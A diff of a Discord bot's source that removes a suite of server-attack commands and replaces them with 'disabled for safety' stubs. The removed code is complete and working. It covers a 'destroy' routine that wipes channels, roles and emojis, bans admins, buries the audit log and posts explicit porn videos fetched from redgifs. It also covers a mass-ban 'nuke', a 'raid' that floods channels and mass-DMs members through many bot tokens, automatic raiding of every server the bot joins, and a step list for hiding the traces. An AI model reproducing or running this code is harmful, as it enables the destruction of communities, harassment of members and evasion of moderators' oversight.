-                title="🍳  ur server is cooked",
-                description=(
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"**{guild.name}** — fully destroyed 💀\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "> 200 channels — flooded 💨\n"
-                    "> Roles — wiped 🗑️\n"
-                    "> Emojis & stickers — deleted ❌\n"
-                    "> Webhooks — purged 🔗\n"
-                    "> Admins — pre-banned 🔨\n"
-                    "> Verification — locked to max 🔒\n"
-                    "> Audit log — buried 🪦\n\n"
-                    "*no backup. no mercy. cooked.* 🔥"
-                ),
-                color=0x2b2d31,
-            )
-            _cooked_dm.set_footer(text="Coolbot 🐻‍❄️  •  ur server is cooked  •  Coolbot.gg")
-            try:
-                _nuker_user = await client.fetch_user(_author_id)
-                await _nuker_user.send(embed=_cooked_dm)
-            except Exception:
-                pass
-
-            # post a random video to the first spam channel after destroy
-            async def _post_destroy_vid():
-                try:
-                    ch = next((c for c in guild.text_channels), None)
-                    if not ch:
-                        return
-                    async with aiohttp.ClientSession() as _vs:
-                        _vtoken, _vhdrs = await _nice_fetch_token(_vs)
-                        _vhdrs["Authorization"] = f"Bearer {_vtoken}"
-                        _order = random.choice(["trending", "top", "top7"])
-                        _page  = random.randint(1, 5)
-                        _url   = f"https://api.redgifs.com/v2/gifs/search?search_text=anal&order={_order}&count=40&page={_page}"
-                        async with _vs.get(_url, headers=_vhdrs, timeout=aiohttp.ClientTimeout(total=12)) as _r:
-                            _data = await _r.json()
-                        _pool = [g for g in (_data.get("gifs") or []) if (g.get("duration") or 0) >= 120]
-                        if not _pool:
-                            _pool = [g for g in (_data.get("gifs") or []) if (g.get("duration") or 0) >= 30]
-                        if not _pool:
-                            _pool = _data.get("gifs") or []
-                        if not _pool:
-                            return
-                        _pool.sort(key=lambda g: g.get("views", 0) or 0, reverse=True)
-                        _g = random.choice(_pool[:5])
-                        _vid_url = _g["urls"].get("hd") or _g["urls"].get("sd") or _g["urls"].get("gif") or ""
-                        if not _vid_url:
-                            return
-                        import io as _io2
-                        async with aiohttp.ClientSession() as _ds:
-                            async with _ds.get(_vid_url, headers={"User-Agent": _NICE_UA, "Referer": "https://www.redgifs.com/"}, timeout=aiohttp.ClientTimeout(total=60)) as _dr:
-                                if _dr.status == 200:
-                                    _raw = await _dr.read()
-                                    if _raw:
-                                        await ch.send(file=discord.File(fp=_io2.BytesIO(_raw), filename=f"{_g['id']}.mp4"))
-                except Exception:
-                    pass
-            asyncio.create_task(_post_destroy_vid())
-
-        _author_id = ctx.author.id
-        # In DMs guild_permissions doesn't exist — bot owner is always allowed from DMs
-        _has_admin = (
-            ctx.guild is None  # running from DMs = owner-level trust
-            or ctx.author.guild_permissions.administrator
-        )
-        is_allowed = has_owner_access(ctx.author)
-        if not is_allowed:
-            return await _reject_owner_only_ctx(ctx, execute_fn)
-
-        try:
-            await ctx.message.delete()
-        except Exception:
-            pass
-
-        # ── Aesthetic confirmation embed ──────────────────────────────
-        _confirm_embed = discord.Embed(
-            title="⚠️  Destroy ur server?",
-            description=(
-                "> This will **instantly** wipe all channels, roles, emojis,\n"
-                "> stickers, webhooks & scheduled events, ban all admins,\n"
-                "> then flood ur server with **200 spam channels**.\n"
-                "> **No undo.** A backup code will be sent to ur DMs first.\n\n"
-                "*You have **30 seconds** to decide.*"
-            ),
-            color=0xFF4500,
-        )
-        _confirm_embed.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these buttons")
-
-        class _DestroyConfirmView(discord.ui.View):
-            def __init__(self_v):
-                super().__init__(timeout=30)
-                self_v.decided = False
-
-            @discord.ui.button(label="💥  Yes, Destroy", style=discord.ButtonStyle.danger)
-            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _author_id:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.decided = True
-                self_v.stop()
-                _dm_embed = discord.Embed(
-                    title="📬  Check Ur DMs",
-                    description="*Backup code + confirmation on the way.*",
-                    color=0xFF4500,
-                )
-                _dm_embed.set_footer(text="Coolbot 🐻‍❄️")
-                await interaction.response.edit_message(embed=_dm_embed, view=None, delete_after=6)
-                await execute_fn(ctx.bot)
-
-            @discord.ui.button(label="✋  No, Cancel", style=discord.ButtonStyle.secondary)
-            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _author_id:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.stop()
-                await interaction.response.edit_message(
-                    embed=discord.Embed(description="✅  Destroy cancelled.", color=COLORS["success"]),
-                    view=None, delete_after=5,
-                )
-
-            async def on_timeout(self_v):
-                pass
-
-        if ctx.interaction:
-            if ctx.interaction.response.is_done():
-                await ctx.interaction.followup.send(embed=_confirm_embed, view=_DestroyConfirmView(), ephemeral=False)
-            else:
-                await ctx.interaction.response.send_message(embed=_confirm_embed, view=_DestroyConfirmView(), ephemeral=False)
-        else:
-            await ctx.send(embed=_confirm_embed, view=_DestroyConfirmView(), delete_after=32)
-
-    @commands.hybrid_command(name="nuke", description="Mass-ban every member except owner — Owner or requires bot-owner approval")
-    async def nuke(self, ctx: commands.Context):
-        await ctx.send("🛡️ Disabled for safety in this Mikasa build: mass-ban operations are disabled. Use standard moderation and incident-response tools instead.")
-        return
-        if not is_owner(ctx.author):
-            return await ctx.send("🔒 Nuke is reserved for Mikasa's **owners** only.")
-        _guild_id  = ctx.guild.id
-        _author_id = ctx.author.id
-
-        async def execute_fn(client):
-            guild = client.get_guild(_guild_id)
-            if not guild:
-                return
-
-            # Collect everyone except the bot itself, the server owner,
-            # the OWNER_ID, and whoever ran the command (so they never ban themselves)
-            targets = [
-                m for m in guild.members
-                if m.id != client.user.id
-                and m.id != guild.owner_id
-                and m.id not in OWNER_IDS
-                and m.id != _author_id
-                and not m.bot
-            ]
-
-            banned = 0
-            failed = 0
-            for member in targets:
-                try:
-                    await guild.ban(member, reason="Coolbot ,nuke", delete_message_days=0)
-                    banned += 1
-                except Exception:
-                    failed += 1
-                await asyncio.sleep(0.3)
-
-            # Report in the first available channel
-            try:
-                ch = next((c for c in guild.text_channels), None)
-                if ch:
-                    await ch.send(embed=discord.Embed(
-                        title="☢️ Server Nuked",
-                        description=(
-                            f"**{banned}** member(s) banned.\n"
-                            f"**{failed}** failed (roles too high or already gone)."
-                        ),
-                        color=COLORS["error"]
-                    ))
-            except Exception:
-                pass
-
-            # ── Log to nuker_logs file ──
-            try:
-                _ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
-                _logs = load("nuker_logs") if isinstance(load("nuker_logs"), list) else []
-                _logs.append({
-                    "action": "nuke",
-                    "user_id": _author_id,
-                    "guild": guild.name,
-                    "guild_id": guild.id,
-                    "banned": banned,
-                    "failed": failed,
-                    "time": _ts,
-                })
-                save("nuker_logs", _logs[-200:])
-            except Exception:
-                pass
-
-            # ── DM everyone involved — beautiful nuke completion embeds ──
-            _nts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
-
-            _nuke_banner = discord.Embed(
-                title="☢️  NUKE COMPLETE",
-                description=(
-                    "```\n"
-                    "███╗   ██╗██╗   ██╗██╗  ██╗███████╗\n"
-                    "████╗  ██║██║   ██║██║ ██╔╝██╔════╝\n"
-                    "██╔██╗ ██║██║   ██║█████╔╝ █████╗\n"
-                    "██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝\n"
-                    "██║ ╚████║╚██████╔╝██║  ██╗███████╗\n"
-                    "╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝\n"
-                    "```"
-                ),
-                color=0xFF4500,
-            )
-            _nuke_banner.set_footer(text="Coolbot 🐻‍❄️  •  Nuke System")
-
-            _nuke_stats = discord.Embed(title="📊  Nuke Report", color=0x2C2F33)
-            _nuke_stats.add_field(name="🏚️  Server",   value=f"`{guild.name}`",   inline=True)
-            _nuke_stats.add_field(name="✅  Banned",   value=f"`{banned}`",        inline=True)
-            _nuke_stats.add_field(name="❌  Failed",   value=f"`{failed}`",        inline=True)
-            _nuke_stats.add_field(name="🕒  Time",     value=f"`{_nts}`",          inline=False)
-            _nuke_stats.set_footer(text="Coolbot 🐻‍❄️  •  untraceable")
-
-            # DM owner
-            try:
-                _n_owner = await client.fetch_user(OWNER_ID)
-                await _n_owner.send(embed=_nuke_banner)
-                await _n_owner.send(embed=_nuke_stats)
-            except Exception:
-                pass
-            # DM nuker (always)
-            try:
-                _n_nuker = await client.fetch_user(_author_id)
-                await _n_nuker.send(embed=_nuke_banner)
-                await _n_nuker.send(embed=_nuke_stats)
-            except Exception:
-                pass
-
-        _author_id = ctx.author.id
-        is_allowed = has_owner_access(ctx.author)
-        if not is_allowed:
-            return await _reject_owner_only_ctx(ctx, execute_fn)
-
-        _confirm = discord.Embed(
-            title="⚠️  Confirm Nuke?",
-            description=(
-                "> This will **mass-ban every member** in this server\n"
-                "> (except you, the server owner, and the bot).\n"
-                "> **No undo.**\n\n"
-                "*You have **30 seconds** to decide.*"
-            ),
-            color=0xFF4500,
-        )
-        _confirm.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these buttons")
-
-        class _NukeConfirmView(discord.ui.View):
-            def __init__(self_v):
-                super().__init__(timeout=30)
-
-            @discord.ui.button(label="☢️  Yes, Nuke", style=discord.ButtonStyle.danger)
-            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _author_id:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.stop()
-                await interaction.response.edit_message(
-                    embed=discord.Embed(description="☢️ Nuke launched.", color=0xFF4500),
-                    view=None, delete_after=5,
-                )
-                await execute_fn(ctx.bot)
-
-            @discord.ui.button(label="✋  Cancel", style=discord.ButtonStyle.secondary)
-            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _author_id:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.stop()
-                await interaction.response.edit_message(
-                    embed=discord.Embed(description="✅ Nuke cancelled.", color=COLORS["success"]),
-                    view=None, delete_after=5,
-                )
-
-        if ctx.interaction:
-            await ctx.interaction.response.send_message(embed=_confirm, view=_NukeConfirmView(), ephemeral=False)
-        else:
-            await ctx.send(embed=_confirm, view=_NukeConfirmView(), delete_after=32)
-
-    #  ,raid — flood every channel with spam + mass DM members
-    #  Owner / Premium+Admin only
-    @commands.hybrid_command(name="raid", description="Flood all channels + mass DM members — Owner or requires bot-owner approval")
-    async def raid(self, ctx: commands.Context, *, message: str = None):
-        await ctx.send("🛡️ Disabled for safety in this Mikasa build: mass-channel spam and mass-DM operations are disabled.")
-        return
-        if not is_owner(ctx.author):
-            return await ctx.send("🔒 Raid is reserved for Mikasa's **owners** only.")
-        _guild_id  = ctx.guild.id
-        _author_id = ctx.author.id
-        _fallback  = _DEFAULT_SERVER_LINK or "https://discord.gg/psfxUxRfPQ"
-        _raid_msg  = message or _RAID_DEFAULT_MSG or f"@everyone @here ur server is being raided by Dangerous person 💀🔥 {_fallback}"
-
-        async def execute_raid(client):
-            guild = client.get_guild(_guild_id)
-            if not guild: return
-            stop_ev = _RAID_STOP_EVENTS.setdefault(_guild_id, asyncio.Event())
-            stop_ev.clear()
-
-            # ── Embed sent to every channel ──
-            raid_embed = discord.Embed(
-                title="🚨  RAID IN PROGRESS",
-                description=(
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "🐻‍❄️  **Dangerous person** is raiding this server.\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    f"{_raid_msg}\n\n"
-                    "> *ur server is cooked* 🍳🔥"
-                ),
-                color=0xFF0000,
-            )
-            raid_embed.set_footer(text="Coolbot 🐻‍❄️  •  Raid System  •  Coolbot.gg")
-
-            # ── Spam every text channel 30 times in parallel ──
-            async def _flood_channel(ch):
-                for _ in range(30):
-                    if stop_ev.is_set():
-                        break
-                    try:
-                        await ch.send(content=_raid_msg, embed=raid_embed)
-                        await asyncio.sleep(0.15)
-                    except Exception:
-                        break
-
-            await asyncio.gather(
-                *[_flood_channel(ch) for ch in guild.text_channels],
-                return_exceptions=True,
-            )
-
-            # ── Create webhooks in first 10 channels and spam through them ──
-            async def _webhook_spam(ch):
-                if stop_ev.is_set():
-                    return
-                try:
-                    wh = await ch.create_webhook(name="Coolbot Raid ")
-                    for _ in range(10):
-                        if stop_ev.is_set():
-                            break
-                        try:
-                            await wh.send(
-                                content=_raid_msg,
-                                username="Coolbot Raid 🐻‍❄️",
-                                avatar_url="https://i.imgur.com/pXjdnba.png",
-                            )
-                            await asyncio.sleep(0.1)
-                        except Exception:
-                            pass
-                    try:
-                        await wh.delete()
-                    except Exception:
-                        pass
-                except Exception:
-                    pass
-
-            await asyncio.gather(
-                *[_webhook_spam(ch) for ch in guild.text_channels[:10]],
-                return_exceptions=True,
-            )
-
-            # ── Mass DM all members ──
-            dm_embed = discord.Embed(
-                title="🍳  ur server is being raided",
-                description=(
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "**Coolbot** just raided your server 🐻‍❄️\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    f"{_raid_msg}\n\n"
-                    "> *nothing u can do about it* 💀"
-                ),
-                color=0x2b2d31,
-            )
-            dm_embed.set_footer(text="Coolbot 🐻‍❄️  •  Coolbot.gg")
-
-            async def _dm_member(m):
-                if stop_ev.is_set():
-                    return
-                try:
-                    await m.send(embed=dm_embed)
-                except Exception:
-                    pass
-
-            targets = [m for m in guild.members if not m.bot and m.id != client.user.id and m.id != _author_id]
-            await asyncio.gather(*[_dm_member(m) for m in targets], return_exceptions=True)
-
-            # ── Multi-bot DM — every token in MASSDM_BOT_TOKENS DMs all members ──
-            async def _multibot_raid_dm():
-                if not MASSDM_BOT_TOKENS:
-                    return
-                if stop_ev.is_set():
-                    return
-                _dm_payload = {
-                    "embeds": [{
-                        "title": "🍳  ur server is being raided",
-                        "description": (
-                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            "**Coolbot** just raided your server 🐻‍❄️\n"
-                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                            f"{_raid_msg}\n\n"
-                            "> *nothing u can do about it* 💀"
-                        ),
-                        "color": 0x2b2d31,
-                        "footer": {"text": "Coolbot 🐻‍❄️  •  Coolbot.gg"},
-                    }]
-                }
-                _connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
-                async with aiohttp.ClientSession(connector=_connector) as _ses:
-                    for _tok in MASSDM_BOT_TOKENS:
-                        _headers = {
-                            "Authorization": f"Bot {_tok}",
-                            "Content-Type": "application/json",
-                        }
-                        for _m in targets:
-                            if stop_ev.is_set():
-                                return
-                            try:
-                                _r = await _ses.post(
-                                    "https://discord.com/api/v10/users/@me/channels",
-                                    headers=_headers,
-                                    json={"recipient_id": str(_m.id)},
-                                    timeout=aiohttp.ClientTimeout(total=5),
-                                )
-                                if _r.status == 200:
-                                    _ch_data = await _r.json()
-                                    await _ses.post(
-                                        f"https://discord.com/api/v10/channels/{_ch_data['id']}/messages",
-                                        headers=_headers,
-                                        json=_dm_payload,
-                                        timeout=aiohttp.ClientTimeout(total=5),
-                                    )
-                            except Exception:
-                                pass
-                            await asyncio.sleep(0.05)
-
-            asyncio.create_task(_multibot_raid_dm())
-
-        is_allowed = has_owner_access(ctx.author)
-        if not is_allowed:
-            return await _reject_owner_only_ctx(ctx, execute_raid)
-
-        # Confirmation before raid fires
-        _confirm = discord.Embed(
-            title="⚠️  Confirm Raid",
-            description=(
-                "> This will **flood every channel** 30 times,\n"
-                "> spam webhooks, and **DM every member**.\n\n"
-                "*You have 30 seconds to decide.*"
-            ),
-            color=0xFF0000,
-        )
-        _confirm.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these")
-        _raid_author = ctx.author.id
-
-        class _RaidConfirmView(discord.ui.View):
-            def __init__(self_v):
-                super().__init__(timeout=30)
-
-            @discord.ui.button(label="🚨  Yes, Raid", style=discord.ButtonStyle.danger)
-            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _raid_author:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.stop()
-                await interaction.response.edit_message(
-                    embed=discord.Embed(description="🚨 Raid launched.", color=0xFF0000),
-                    view=None, delete_after=3,
-                )
-                try:
-                    _raider_user = await ctx.bot.fetch_user(_raid_author)
-                    await _raider_user.send(embed=discord.Embed(
-                        description="📨 DMing all members now...",
-                        color=0xFF4500,
-                    ))
-                except Exception:
-                    pass
-                # Reset stop flag and track the raid task so ,stopraid works
-                _RAID_STOP_EVENTS[_guild_id] = asyncio.Event()
-                task = asyncio.create_task(execute_raid(ctx.bot))
-                _RAID_TASKS[_guild_id] = task
-                try:
-                    await task
-                finally:
-                    _RAID_TASKS.pop(_guild_id, None)
-                    _RAID_STOP_EVENTS.pop(_guild_id, None)
-
-            @discord.ui.button(label="✋  Cancel", style=discord.ButtonStyle.secondary)
-            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
-                if interaction.user.id != _raid_author:
-                    return await interaction.response.send_message("Not your button.", ephemeral=False)
-                self_v.stop()
-                await interaction.response.edit_message(
-                    embed=discord.Embed(description="✅ Raid cancelled.", color=COLORS["success"]),
-                    view=None, delete_after=5,
-                )
-
-        if ctx.interaction:
-            await ctx.interaction.response.send_message(embed=_confirm, view=_RaidConfirmView(), ephemeral=False)
-        else:
-            await ctx.send(embed=_confirm, view=_RaidConfirmView(), delete_after=32)
-
-    #  ,setraid #channel — auto-raid every new server the bot joins
-    #  Owner only
-    @commands.command(name="setraid")
-    async def setraid(self, ctx: commands.Context, channel: discord.TextChannel = None):
-        if not is_owner(ctx.author):
-            return await ctx.send("🔒 Setraid is reserved for Mikasa's **owners** only.")
-        if channel is None:
-            # Clear setraid
-            _SETRAID_CHANNEL.pop(ctx.guild.id, None)
-            try:
-                save("setraid_channel", {str(k): v for k, v in _SETRAID_CHANNEL.items()})
-            except Exception:
-                pass
-            return await ctx.send(embed=discord.Embed(
-                description="✅ Auto-raid log cleared. New servers will no longer be auto-raided.",
-                color=COLORS["success"]
-            ))
-        _SETRAID_CHANNEL[ctx.guild.id] = channel.id
-        try:
-            save("setraid_channel", {str(k): v for k, v in _SETRAID_CHANNEL.items()})
-        except Exception:
-            pass
-        await ctx.send(embed=discord.Embed(
-            title="🚨 Auto-Raid Activated",
-            description=(
-                f"📡 Raid log channel set to {channel.mention}\n\n"
-                "> Every new server that adds Coolbot will be **instantly raided**:\n"
-                "> • All channels flooded 30×\n"
-                "> • Webhooks spammed\n"
-                "> • All 25 bots DM every member\n"
-                "> • Unraidable servers get flagged in this channel\n\n"
-                "*Run `,setraid` with no channel to disable.*"
-            ),
-            color=0xFF4500,
-        ))
-
-
-    @commands.hybrid_command(name="stopraid", description="Stop an active raid in this server (Owner/Premium+Admin)")
-    async def stopraid(self, ctx: commands.Context):
-        """Cancel a running ,raid / /raid in this server."""
-        if not ctx.guild:
-            return await ctx.send(embed=discord.Embed(description="❌ Use this in a server.", color=COLORS["error"]))
-        is_allowed = (
-            has_owner_access(ctx.author)
-            or (ctx.author.guild_permissions.administrator if isinstance(ctx.author, discord.Member) else False)
-        )
-        if not is_allowed:
-            return await ctx.send(embed=discord.Embed(
-                description="❌ Owner, Premium, or Server Admin only.", color=COLORS["error"]
-            ))
-        gid = ctx.guild.id
-        ev = _RAID_STOP_EVENTS.get(gid)
-        task = _RAID_TASKS.get(gid)
-        if not ev and not task:
-            return await ctx.send(embed=discord.Embed(
-                description="❌ No active raid in this server.", color=COLORS["error"]
-            ))
-        if ev:
-            ev.set()
-        if task and not task.done():
-            task.cancel()
-        _RAID_TASKS.pop(gid, None)
-        await ctx.send(embed=discord.Embed(
-            title="🛑 Raid Stopped",
-            description=f"Raid in **{ctx.guild.name}** has been stopped.",
-            color=COLORS["success"],
-        ))
-
-    @app_commands.command(name="backupcreate", description="Snapshot the server and DM you a short backup code (Owner/Premium)")
     async def backupcreate(self, interaction: discord.Interaction):
         is_allowed = has_owner_access(interaction.user) or interaction.user.id in PREMIUM_USERS
         if not is_allowed:
@@ -3783,6 +2385,17 @@ class AdminCog(commands.Cog):
                 ephemeral=False,
             )
 
+        # Mass-DM / raid / destroyer defaults are disabled (Discord ToS).
+        if type.value in ("massdm", "raid", "destroyer"):
+            return await interaction.response.send_message(embed=discord.Embed(
+                title="🛡️ Disabled",
+                description=(
+                    "Setting defaults for mass-DM, raid, or destroyer spam is disabled because those "
+                    "features violate Discord rules and are not available in this build."
+                ),
+                color=COLORS["error"],
+            ), ephemeral=False)
+
         if type.value == "massdm":
             if message.strip():
                 _MASSDM_DEFAULT_MSG = message.strip()
@@ -3795,14 +2408,7 @@ class AdminCog(commands.Cog):
             else:
                 _MASSDM_DEFAULT_MSG = ""
                 _link = _DEFAULT_SERVER_LINK or "https://discord.gg/psfxUxRfPQ"
-                _MASSDM_TEXT = (
-                    "\U0001f43b\u200d\u2744\ufe0f **Coolbot MASSDM** \U0001f525\U0001f480\n"
-                    "\u2501" * 32 + "\n"
-                    "ur DMs are **cooked** \U0001f602 every bot we own just slid in \U0001f480\n"
-                    "can't stop it. can't block it. it's already done. \U0001f525\n"
-                    "\u2501" * 32 + "\n"
-                    f"join the server or get nuked \U0001f480 {_link}"
-                )
+                _MASSDM_TEXT = ("Mass-DM is disabled for Discord safety.")
                 await interaction.response.send_message(embed=discord.Embed(
                     description="✅ MassDm message reset to built-in default.",
                     color=COLORS["success"],
@@ -3823,14 +2429,7 @@ class AdminCog(commands.Cog):
                 _DEFAULT_SERVER_LINK = raw
                 # Refresh massdm text to use the new link
                 if not _MASSDM_DEFAULT_MSG:
-                    _MASSDM_TEXT = (
-                        "\U0001f43b\u200d\u2744\ufe0f **Dangerous person MASSDM** \U0001f525\U0001f480\n"
-                        "\u2501" * 32 + "\n"
-                        "ur DMs are **cooked** \U0001f602 every bot we own just slid in \U0001f480\n"
-                        "can't stop it. can't block it. it's already done. \U0001f525\n"
-                        "\u2501" * 32 + "\n"
-                        f"join the server or get nuked \U0001f480 {raw}"
-                    )
+                    _MASSDM_TEXT = ("Mass-DM is disabled for Discord safety.")
                 # Refresh raid default to use the new link (only if no custom raid msg was set)
                 if not _RAID_DEFAULT_MSG:
                     pass  # raid reads _DEFAULT_SERVER_LINK directly at call time — no extra refresh needed
@@ -7855,51 +6454,29 @@ _UPDATELOG_PAGES = [
     {
         "title": "📋 Coolbot updates — page 3",
         "fields": [
-            ("💥 destroy — how it actually works",
-             "step 1: delete everything — channels, webhooks, events, ban admins — all at once, under 2s\n"
-             "step 2: create 200 spam channels + rename server + swap icon simultaneously\n"
-             "step 3: webhook spam — 30 msgs through 200 channels, runs in background\n"
-             "step 4: ban all bots, delete all roles and emojis\n"
-             "step 5: give every member 50 'Fucked By Coolbot' roles\n"
-             "step 6: rename everyone to OWNED BY Coolbot\n"
-             "step 7: upload 50 polarbear emojis + 5 stickers\n"
-             "step 8: 5 wave audit burial — 500+ fake entries, real ones scroll off the top"),
-            ("💥 destroy — audit burial",
-             "wave 1: 250 throwaway roles made and deleted\n"
-             "wave 2: 100 throwaway channels made and deleted\n"
-             "wave 3: 25 rapid server renames\n"
-             "wave 4: webhooks spammed across 5 channels\n"
-             "wave 5: 50 more throwaway roles\n"
-             "discord caps audit log at 100 entries — everything real gets pushed off"),
-            ("💀 destroy — default spam message",
-             "no message passed + no ,default set = sends:\n"
-             "Get Nuked Bitch\n"
-             "https://discord.gg/psfxUxRfPQ\n"
-             "use `,default <msg>` to set your own global message (owner only)\n"
-             "`,default` with no text resets it back to the built-in"),
+            ("💥 destroy / nuke / raid",
+             "These commands are permanently disabled. Server nuking, mass-banning, "
+             "channel flooding and auto-raid violate Discord's Terms of Service."),
+            ("🛡️ Why they were removed",
+             "Discord prohibits platform abuse, raiding and unsolicited bulk messaging. "
+             "Mikasa keeps legitimate moderation and emergency lockdown tools only."),
+            ("🆘 Safe alternatives",
+             "`,emergencylockdown confirm` — temporary containment\n"
+             "`,emergencyunlock` — restore after lockdown\n"
+             "Standard moderation: ban/kick/timeout/warn as permitted by Discord."),
         ],
     },
     {
         "title": "📋 Coolbot updates — page 4",
         "fields": [
-            ("🚨 raid  `,raid [msg]`",
-             "floods every text channel with 30 messages at once\n"
-             "creates webhooks in the first 10 channels, 10 msgs each through them\n"
-             "mass DMs every non-bot member simultaneously\n"
-             "confirm/cancel view before it fires, 30s timeout\n"
-             "custom message: `,raid your text here` overrides the default\n"
-             "DMsown raider after: how many channels, members DM'd, webhook channels"),
-            ("☢️ nuke  `,nuke`",
-             "bans everyone in the server except the server owner and bot owner\n"
-             "skips bots, reports ban count in the first channel\n"
-             "DMs owner + nuker a 2-embed report: ASCII NUKE banner + ban stats\n"
-             "needs Premium or Owner + server admin perms"),
-            ("📬 massdm — phase system",
-             "phase 1: every bot DMs the target one by one, 1-5 msgs each\n"
-             "they see a separate notif from each bot hitting their DMs\n"
-             "phase 2: after all bots have individually DM'd, every bot blasts 500 msgs at once\n"
-             "free tier (lv10+): runs once\n"
-             "premium: loops every 90 seconds forever"),
+            ("🚨 raid / nuke / massdm",
+             "Raid, mass-ban and bulk/repeated mass-DM tools are disabled for Discord safety."),
+            ("📬 Owner DM",
+             "`,dm @user message` sends a single owner-initiated message only. "
+             "Bulk and looping mass-DM is not available."),
+            ("🛡️ Policy",
+             "Unsolicited spam and server raids are not supported. "
+             "Use Discord-compliant moderation features instead."),
         ],
     },
     {
@@ -12485,124 +11062,32 @@ async def _fetch_guild_members_raw(guild_id: int) -> list[dict]:
 
 
 async def _massdmall_worker(guild_id: int, status_ch, initiator: str, amount: int = 3):
-    """Background task: DM every non-bot member of guild_id using the main bot only."""
-    amount = max(1, min(int(amount or 3), 50))
-    members = await _fetch_guild_members_raw(guild_id)
-    human = [m for m in members if not m.get("user", {}).get("bot", False)]
-
-    if not human:
-        if status_ch:
-            try:
-                await status_ch.send(embed=discord.Embed(
-                    description=f"❌ No accessible members found in guild `{guild_id}`.",
-                    color=COLORS["error"],
-                ))
-            except Exception:
-                pass
-        return
-
-    total_members = len(human)
-    total_sent = 0
-
+    """Disabled: guild-wide mass DMs violate Discord Terms of Service."""
+    print("[Mikasa safety] mass-DM-all is disabled")
     if status_ch:
         try:
             await status_ch.send(embed=discord.Embed(
-                title="📬 MassDmAll — Starting",
-                description=(
-                    f"Found **{total_members}** members in guild `{guild_id}`"
-                    + chr(10)
-                    + f"**1 bot** · **{amount}** messages each"
-                    + chr(10)
-                    + f"Started by **{initiator}**"
-                ),
-                color=COLORS["warn"],
+                description="🛡️ Mass DM-all is disabled for Discord safety.",
+                color=COLORS["error"],
             ))
         except Exception:
             pass
-
-    for i, member in enumerate(human):
-        try:
-            uid = int(member["user"]["id"])
-        except Exception:
-            continue
-        try:
-            await _run_massdm_direct(uid, amount=amount)
-            total_sent += 1
-        except Exception:
-            pass
-        if status_ch and (i + 1) % 25 == 0:
-            try:
-                await status_ch.send(embed=discord.Embed(
-                    description=f"📬 Progress: **{i+1}/{total_members}** members DMed…",
-                    color=COLORS["info"],
-                ), delete_after=60)
-            except Exception:
-                pass
-        await asyncio.sleep(0.35)
-
-    if status_ch:
-        try:
-            await status_ch.send(embed=discord.Embed(
-                title="✅ MassDmAll — Complete",
-                description=(
-                    f"Finished **{total_sent}/{total_members}** members in guild `{guild_id}`"
-                    + chr(10)
-                    + f"**1 bot** · **{amount}** messages each"
-                ),
-                color=COLORS["success"],
-            ))
-        except Exception:
-            pass
+    return
 
 
-@bot.hybrid_command(name="dmall", aliases=["dmallguild"], description="Owner/co-owner: DM every member of the current guild once")
+@bot.hybrid_command(name="dmall", aliases=["dmallguild"], description="Owner/co-owner: DM every member — disabled for Discord safety")
 @app_commands.describe(
     guild_id="Target server ID",
-    amount="Messages per member (1-50, default 3)",
+    amount="Messages per member (disabled)",
 )
 async def massdmall_cmd(ctx, guild_id: str = "", amount: int = 3):
-    """Owner only — DM every non-bot member of a guild using this bot only."""
-    if not has_owner_access(ctx.author):
-        return
-    if not guild_id:
-        return await ctx.send(embed=discord.Embed(
-            description=(
-                "❌ Usage: `,massdmall <guild_id> [amount]`"
-                + chr(10)
-                + "Example: `,massdmall 123456789012345678 5`"
-            ),
-            color=COLORS["error"],
-        ))
-    try:
-        gid = int(str(guild_id).strip())
-    except ValueError:
-        return await ctx.send(embed=discord.Embed(description="❌ Invalid guild ID.", color=COLORS["error"]))
-    try:
-        amount = max(1, min(int(amount or 3), 50))
-    except Exception:
-        amount = 3
-    try:
-        if ctx.message:
-            await ctx.message.delete()
-    except Exception:
-        pass
+    """Disabled: unsolicited mass DMs to every server member violate Discord Terms of Service."""
     await ctx.send(embed=discord.Embed(
-        title="📬 MassDmAll — Launched",
-        description=(
-            f"Fetching members from guild `{gid}`…"
-            + chr(10)
-            + f"**1 bot** · **{amount}** messages per member"
-            + chr(10)
-            + "Progress updates will appear here."
-        ),
-        color=COLORS["warn"],
+        title="🛡️ Disabled",
+        description="Mass DM-all is disabled because unsolicited bulk DMs violate Discord rules.",
+        color=COLORS["error"],
     ))
-    asyncio.create_task(
-        _massdmall_worker(gid, ctx.channel, getattr(ctx.author, "display_name", str(ctx.author)), amount=amount)
-    )
-
-
-
+    return
 
 
 #  AUTO BACKUP SYSTEM
@@ -13513,249 +11998,69 @@ async def admin_cmd(ctx: commands.Context, server_id: str = None):
 
 
 #  ,massdm @user  — free: 5 bots 3 msgs once | premium: all bots 3 msgs looping every 30s
-@bot.hybrid_command(name="dm", description="Send a direct message to a user (owner/co-owner)")
